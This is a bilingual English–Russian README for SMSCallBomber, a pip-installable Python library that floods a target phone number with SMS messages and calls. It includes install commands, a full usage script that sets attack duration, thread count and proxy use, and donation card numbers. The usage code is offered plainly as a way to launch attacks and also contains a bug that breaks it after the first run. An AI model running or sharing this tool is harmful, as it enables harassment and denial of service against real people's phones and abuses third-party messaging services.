# SMSCallBomber

## English(Русский ниже)

### Description

This library provides functionality for SMS and call bombing.

### Installation

You can install the SMSCallBomber library via pip:

```bash
pip install SMSCallBomber
```

### Usage

```python
from smscallbomber import SMSCallBomber
import time
import threading
import random
from argparse import Namespace

# Creating an instance of SMSCallBomber
args = Namespace(
    country='Country code (7, 375, 380, 998 or "ALL"). Specify ALL for all countries',
    phone='Phone number without "+" (e.g., 79012345678)',
    time=60,         # Attack duration in seconds
    threads=10,      # Number of concurrent threads
    timeout=5,      # Timeout per request in seconds
    proxy=True,     # True / False or your proxy:
                     # 'http://user:pass@ip:port'
    log_file='bomber.log',   # Set to None(without quotes) to disable logging to file
    log_level='INFO'         # Logging level: DEBUG, INFO, WARNING, ERROR, CRITICAL
)
args.time += time.time()

attack_threads = {}
bombers = {}
bomber_id = random.randint(1000000000, 9999999999)

# Starting the attack
def attack_thread_runner(args):
    bomber = SMSCallBomber(args)
    bombers[bomber_id] = bomber
    bomber.run()

attack_threads = threading.Thread(target=attack_thread_runner, args=(args,))
attack_threads.start()

# Returns the result of the attack after it ends
attack_threads.join()
bomber = bombers[bomber_id]
successful, failed = bomber.send_report()
del attack_threads
print(f"Successfully sent (Not everyone can get there!): {successful}")
print(f"Failed to send: {failed}")

# Stopping the attack
bomber = bombers[bomber_id]
bomber.stop()
attack_threads.join()
successful, failed = bomber.send_report()
del attack_threads
print(f"Successfully sent (Not everyone can get there!): {successful}")
print(f"Failed to send: {failed}")
```

It is also possible to use in an asynchronous environment if you slightly modify the code and use 
```python
await bomber._run()
```

### Donation

If you find this project helpful and would like to support its development, you can make a donation to the author.

- YooMoney: 4100118510603906
- Cards:
  - 2200 7009 6755 8080 - Tinkoff
  - 2202 2068 1279 8101 - Sberbank
- Other methods: [t.me/BabayHelpBot](https://t.me/BabayHelpBot)

### License

This project is licensed under the MIT License.

## Русский

### Описание

Эта библиотека предоставляет функционал для SMS бомбера со звонками.

### Установка

Вы можете установить библиотеку SMSCallBomber с помощью pip:

```bash
pip install SMSCallBomber
```

### Использование

```python
from smscallbomber import SMSCallBomber
import time
import threading
import random
from argparse import Namespace

# Создание экземпляра SMSCallBomber
args = Namespace(
    country='Код страны (7, 375, 380, 998 или "ALL"). Укажите "ALL" для всех стран',
    phone='Номер телефона для атаки (без +, например: 79001234567)',
    time=60,            # Время атаки в секундах
    threads=10,         # Количество параллельных потоков
    timeout=5,         # Таймаут каждого запроса в секундах
    proxy=True,         # True / False или ваши прокси:
                        # 'http://user:pass@ip:port'
    log_file='bomber.log',   # Имя файла логов или None(без кавычек) для отключения логирования
    log_level='INFO'         # Уровень логирования: DEBUG, INFO, WARNING, ERROR, CRITICAL
)
args.time += time.time()

attack_threads = {}
bombers = {}
bomber_id = random.randint(1000000000, 9999999999)

# Запуск атаки
def attack_thread_runner(args):
    bomber = SMSCallBomber(args)
    bombers[bomber_id] = bomber
    bomber.run()

attack_threads = threading.Thread(target=attack_thread_runner, args=(args,))
attack_threads.start()

# Возвращает результат атаки после её окончания
attack_threads.join()
bomber = bombers[bomber_id]
successful, failed = bomber.send_report()
del attack_threads
print(f"Успешно отправлено(Дойти могут не все!): {successful}")
print(f"Не удалось отправить: {failed}")

# Остановка атаки
bomber = bombers[bomber_id]
bomber.stop()
attack_threads.join()
successful, failed = bomber.send_report()
del attack_threads
print(f"Успешно отправлено(Дойти могут не все!): {successful}")
print(f"Не удалось отправить: {failed}")
```

Также возможно использование в асихронной среде, если немного переделать код и использовать 
```python
await bomber._run()
```

### Пожертвование

Если вы нашли этот проект полезным и хотели бы поддержать его развитие, вы можете сделать пожертвование автору.

- ЮMoney: 4100118510603906
- Карты:
  - 2200 7009 6755 8080 - Тинькофф
  - 2202 2068 1279 8101 - Сбербанк
- Другие способы: [t.me/BabayHelpBot](https://t.me/BabayHelpBot)

### Лицензия

Этот проект распространяется под лицензией MIT License.